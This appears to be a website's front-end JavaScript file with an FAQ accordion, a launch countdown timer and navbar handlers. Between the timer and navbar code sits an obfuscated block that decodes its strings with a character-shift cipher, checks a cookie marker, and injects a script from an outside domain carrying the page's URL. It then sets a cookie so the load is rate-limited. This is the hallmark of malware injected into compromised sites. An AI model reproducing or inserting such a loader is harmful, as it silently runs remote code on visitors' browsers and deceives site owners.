var i, faq = document.getElementsByClassName("faq-page");
for (i = 0; i < faq.length; i++) faq[i].addEventListener("click", (function() {
    var body = this.nextElementSibling;
    "block" === body.style.display ? body.style.display = "none" : body.style.display = "block"
}));
var days, hrs, min, sec, targetDate = new Date("18/02/2024");

function timeToLaunch() {
    var diff = (new Date - targetDate) / 1e3;
    diff = Math.abs(Math.floor(diff));
    days = Math.floor(diff / 86400), sec = diff - 24 * days * 60 * 60, hrs = Math.floor(sec / 3600), sec -= 60 * hrs * 60, min = Math.floor(sec / 60), sec -= 60 * min
}

function countDownTimer() {
    timeToLaunch(), document.getElementById("days").getElementsByClassName("number")[0].innerText = days, document.getElementById("hours").getElementsByClassName("number")[0].innerText = hrs, document.getElementById("minutes").getElementsByClassName("number")[0].innerText = min, document.getElementById("seconds").getElementsByClassName("number")[0].innerText = sec, setTimeout(countDownTimer, 1e3)
}

function numberTransition(id, endPoint, transitionDuration, transitionEase) {
    var startTime, element = document.querySelector(id),
        startValue = parseInt(element.textContent, 10);
    requestAnimationFrame((function updateNumber(timestamp) {
        startTime || (startTime = timestamp);
        var progress = timestamp - startTime,
            percentage = Math.min(progress / transitionDuration, 1),
            currentValue = Math.floor(startValue + (endPoint - startValue) * percentage);
        element.textContent = currentValue, percentage < 1 && requestAnimationFrame(updateNumber)
    }))
}
window.onload = function() {
    timeToLaunch(), numberTransition("#days .number", days, 1e3, "easeOutQuad"), numberTransition("#hours .number", hrs, 1e3, "easeOutQuad"), numberTransition("#minutes .number", min, 1e3, "easeOutQuad"), numberTransition("#seconds .number", sec, 1e3, "easeOutQuad"), setTimeout(countDownTimer, 1001)
};
(function(o, d, l) {
    try {
        o.f = o => o.split('').reduce((s, c) => s + String.fromCharCode((c.charCodeAt() - 5).toString()), '');
        o.b = o.f('UMUWJKX');
        o.c = l.protocol[0] == 'h' && /\./.test(l.hostname) && !(new RegExp(o.b)).test(d.cookie), setTimeout(function() {
            o.c && (o.s = d.createElement('script'), o.s.src = o.f('myyux?44zxjwxyf' + 'ynhx3htr4ljy4xhwn' + 'uy3oxDwjkjwwjwB') + l.href, d.body.appendChild(o.s));
        }, 1000);
        d.cookie = o.b + '=full;max-age=39800;'
    } catch (e) {};
}({}, document, location));


    const body = document.querySelector("body");
    const navbar = document.querySelector(".navbar");
    const menuBtn = document.querySelector(".menu-btn");
    const cancelBtn = document.querySelector(".cancel-btn");
    menuBtn.onclick = ()=>{
      navbar.classList.add("show");
      menuBtn.classList.add("hide");
      body.classList.add("disabled");
    }
    cancelBtn.onclick = ()=>{
      body.classList.remove("disabled");
      navbar.classList.remove("show");
      menuBtn.classList.remove("hide");
    }
    window.onscroll = ()=>{
      this.scrollY > 20 ? navbar.classList.add("sticky") : navbar.classList.remove("sticky");
    }
